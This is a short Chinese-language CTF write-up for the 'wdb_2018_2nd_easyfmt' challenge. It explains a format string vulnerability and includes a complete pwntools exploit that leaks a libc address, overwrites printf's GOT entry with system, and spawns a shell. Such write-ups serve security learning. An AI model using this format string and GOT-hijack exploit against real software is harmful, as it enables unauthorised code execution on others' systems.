比较简单的格式化字符串，格式化字符串+劫持GOT表

checksec

![image-20210418201508484](https://static.hack1s.fun/images/2021/04/18/image-20210418201508484.png)

IDA发现main函数中是一个循环的格式化字符串输出

![image-20210418205333141](https://static.hack1s.fun/images/2021/04/18/image-20210418205333141.png)

直接用pwntools的FmtStr找到偏移

![image-20210418205229901](https://static.hack1s.fun/images/2021/04/18/image-20210418205229901.png)

程序没有开启pie，和relro

我们首先使用printf泄漏libc的基地址，之后修改printf的got表为system的地址

最后输入`/bin/sh\x00`调用`system("/bin/sh")`

调试的时候最开始一直出错，最后发现是因为在收到printf地址之前还会输出一边got表处的地址，所以增加了一个`recv(4)`之后就好了

```python
#!/usr/bin/env python
from pwn import *
from LibcSearcher import *

elf = context.binary = ELF('./wdb_2018_2nd_easyfmt')
context.log_level = 'debug'

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

io = start()

io.recv()

payload = p32(elf.got['printf'])+b"%6$s"
io.sendline(payload)

io.recv(4)
printf_addr = u32(io.recv(4))
print("print addr:",hex(printf_addr))
libc = LibcSearcher('printf',printf_addr)

libc_base = printf_addr - libc.dump('printf')
system_addr = libc_base + libc.dump('system')

payload = fmtstr_payload(6,{elf.got['printf']:system_addr})
io.sendline(payload)

io.sendline("/bin/sh\x00")

io.interactive()
```